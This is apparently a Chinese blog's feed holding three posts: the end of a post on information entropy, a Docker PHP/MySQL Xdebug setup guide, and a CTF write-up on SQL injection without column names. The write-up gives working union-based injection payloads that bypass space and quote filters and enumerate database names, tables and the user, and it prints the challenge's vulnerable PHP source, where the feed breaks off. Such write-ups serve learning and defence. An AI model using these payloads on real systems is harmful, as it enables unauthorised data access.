src="/article/entropy/image-20210412204545002.png" class="" title="东南西北" loading="lazy"><h2 id="信息量的计算"><a href="#信息量的计算" class="headerlink" title="信息量的计算"></a>信息量的计算</h2><p>信息也是物理量，类似于<code>千克</code>，选种千克为单位物理量，则测量其他物体的质量就是以多少个单位质量，即多少千克来计算。</p><p>信息也是参照单位事件的不确定性，看看待测事件的不确定性相当于”多少个”参照事件的不确定性，其中”多少个”，便是信息量。</p><p>如果选择参照事件像是抛硬币这样50%两种等概率情况的事件时，测量的信息量的单位就称为比特(bit)。</p><p>测量质量是，可以用待测物体质量m除以参照物体质量B，因为待测物体质量m=参照物体质量B 乘 参照物体个数n，所以知道总质量m 求 个数 n 时，利用除法计算即可。</p><p>可是测量信息时却不能用除法，因为抛三枚硬币产生的等可能结果并非 $3*2=6种$，而是 $2^3=8种$</p><p><code>[正正正,正正反,正反正,正反反,反正正,反正反,反反正,反反反]</code></p><p>不是线性关系，而是指数关系，所以当知道可能情况个数m，想求这些情况相当于多少个n参照事件产生的时，就用对数运算即可。</p><p>$$ m = 2^n $$</p><p>$$ n = log_2m $$</p><p>所以对答案ABCD里哪一选项的不确定性即为<br>$$ log_24 = 2 bits $$<br>这种情况因为每个选项都是25%的等概率才可以，与抛硬币一样，出现正反的概率都是相等的50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>可张三知道有一半可能是C选项时，各个情况的概率就不一样了。这时要分别测量待测事件每种可能的信息量后乘它们各自发生的概率再相加即可。</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>不过我们不知道概率为1/6的情况的不确定性相当于抛多少个硬币所产生的不确定性，m未知就没法用这个公式</p><p>$$ log_2m_A $$</p><p>但1%会发生的情况相当于从100个等概率情况中确定实际情况，而概率的倒数=等概率情况的个数</p><p>$$ p = 1/100 $$<br>$$ 100 = 1/p $$</p><p>用概率的倒数1/p替换等概率情况个数m后就可以计算每种情况的信息量了</p><p>$$ m = 1/p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>再将每个情况的信息量乘对应发生的概率再相加，就能算出总信息量了</p><p>$$ P_A: 1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_b:1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_c:1/2 log_2(2/1) = 0.5 bits $$</p><p>$$ P_d:1/6 log_2(6/1) = 0.43 bits $$</p><p>张三得知<code>&quot;有一半可能是C选项&quot;</code>后的不确定性(熵)为 $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d = 1.79 bits $$</p><p>告诉张三<code>&quot;有一半可能是C选项&quot;</code>后提供的信息为 $2-1.79=0.21 bits$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$$ log_2m $$</p><h3 id="一般分布"><a href="#一般分布" class="headerlink" title="一般分布"></a>一般分布</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/22178202">知乎:信息熵是什么？</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">微信公众号:超智能体 信息论</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">马猛飞,石乐义,魏东平,徐兴华.基于信息熵的分布式Web服务移动目标防御方案[J].计算机技术与发展,2020,30(10):131-136.</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摸鱼的学习总结，搞作品赛必须的理论学习…&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>docker-php+mysql配置debug环境</title>
    <link href="https://err0r.top/article/phpstormdebug/"/>
    <id>https://err0r.top/article/phpstormdebug/</id>
    <published>2021-03-31T03:49:39.000Z</published>
    <updated>2021-03-31T12:59:58.885Z</updated>
    
    <content type="html"><![CDATA[<p>记录下之前搭建过程</p><a id="more"></a><h2 id="前置要求："><a href="#前置要求：" class="headerlink" title="前置要求："></a>前置要求：</h2><ol><li>装好phpstorm</li><li>装好docker</li><li>下载docker-compose(可选)</li></ol><p>最后附一键docker-compose搭建方法，可附带mysql，感谢王神指导。</p><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><h3 id="docker进行PHP多版本部署"><a href="#docker进行PHP多版本部署" class="headerlink" title="docker进行PHP多版本部署"></a>docker进行PHP多版本部署</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>随意，要啥版本起啥容器，可以去<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> 看</p><p>参数解释：</p><pre class="language-none"><code class="language-none">-d ： 后台运行-v ： 目录映射，因为我们要把本地目录映射到容器目录本地目录:容器目录</code></pre><h3 id="安装xdebug模块"><a href="#安装xdebug模块" class="headerlink" title="安装xdebug模块"></a>安装xdebug模块</h3><p>安装vim并换源</p><pre class="language-sh" data-language="sh"><code class="language-sh">echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \&amp;&amp; apt update &amp;&amp; apt install -y vim</code></pre><p>安装xdebug模块</p><p><code>docker exec -it &lt;id&gt; bash</code>进入容器后</p><pre class="language-sh" data-language="sh"><code class="language-sh">docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug \    &amp;&amp; docker-php-ext-enable xdebug</code></pre><p><strong>注意</strong>：php5.6需要指定版本安装xdebug</p><pre class="language-sh" data-language="sh"><code class="language-sh">RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0</code></pre><p>运行<code>php -m</code> 发现已经安装好xdebug模块</p><h3 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h3><pre class="language-sh" data-language="sh"><code class="language-sh">cp &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini-production &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inivim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</code></pre><p>添加</p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>写进去之后重启apache服务 <code>apache2ctl restart</code></p><p>查看phpinfo，访问<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h2><p>php多版本+mysql服务</p><p>目录结构</p><pre class="language-none"><code class="language-none">|docker-compose.yml└--5.6 └-Dockerfile└--7.4 └-Dockerfile</code></pre><p>Docker-compose.yml，如果需要起不同或更多的版本，照着修改yml和Dockerfile即可</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:5.6-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># 自动重启，一般用于开机自启</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># 自设mysql的password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># 由于映射端口，密码需设强密码，否则请关闭端口映射</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:7.4-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6的Dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:5.6-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0 \ # 指定xdebug版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>7.4的dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:7.4-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN  docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug-2.9.0 \ # 最好也指定下版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>在docker-compose.yml所在目录运行<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>如图所示，在映射目录写个phpinfo，用不同端口访问本地可见版本不同，可以非常灵活地调试</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebug模块也加载好了</p><hr><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>在本地映射目录下新建项目并打开，点击右上角配置</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>打开<code>设置Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>打开<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chrome浏览器安装debug插件</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>然后就可以惹</p><hr><h2 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h2><p>一般来说都是在本地搭建环境，尽量别放有公网vps的服务器上…会被打</p><h3 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h3><p>映射目录写phpinfo()，访问对应端口的容器</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysql测试-一键部署可用"><a href="#mysql测试-一键部署可用" class="headerlink" title="mysql测试(一键部署可用)"></a>mysql测试(一键部署可用)</h3><p>映射目录写<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// 自设的mysql密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:"</span> <span class="token punctuation">.</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>测试完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录下之前搭建过程&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="菜鸡教程" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL无列名注入</title>
    <link href="https://err0r.top/article/mardasctf/"/>
    <id>https://err0r.top/article/mardasctf/</id>
    <published>2021-03-29T11:17:53.000Z</published>
    <updated>2021-04-20T08:17:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入的姿势</p><a id="more"></a><p>以DASCTF三月赛为例，记录下无列名注入。</p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>例如join进行无列名注入，现在有张表<code>table</code>如下</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>正常<strong>在数据库查询</strong>，表名需带反引号，在php端中<strong>并不需要</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>如图所示，列名被替换成了数字，</p><table><thead><tr><th>1（派生表列1）</th><th>2（派生表列2）</th><th>3（派生表列3）</th><th>4（派生表列4）</th><th>5（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>我们可以进一步用数字来对应列查询</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">2</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>如果反引号被过滤，同样继续用别名代替</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="别名" loading="lazy"><p>此时派生表如下</p><table><thead><tr><th>1（派生表列1）</th><th>b（原派生表列2）</th><th>3（派生表列3）</th><th>c（原派生表列4）</th><th>d（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>同时查询多个列</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>为<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>以下是比赛WP</p><h3 id="DASCTF三月赛·bestDB"><a href="#DASCTF三月赛·bestDB" class="headerlink" title="DASCTF三月赛·bestDB"></a>DASCTF三月赛·bestDB</h3><blockquote><p>由于电脑崩了:(  bp和网页都没了，只能凭我写了</p></blockquote><p>进去一个查询框，题目名字有db，肯定是注入了。</p><p>注释中发现hint</p><pre class="language-html" data-language="html"><code class="language-html">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>回显位为1和2，改改以前的脚本，查数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>查表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>无列名查询(其实直接查就好，本人复习一下之前的知识)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>查到<code>f1agdas</code>表里有个<code>flag.txt</code>，应该是利用<code>load_file()</code>函数读取文件，查了下用户</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>肯定有权限了，读了<code>index.php</code>和<code>dbConnect.php</code>，给复现的师傅参考</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'drop'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$item</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token 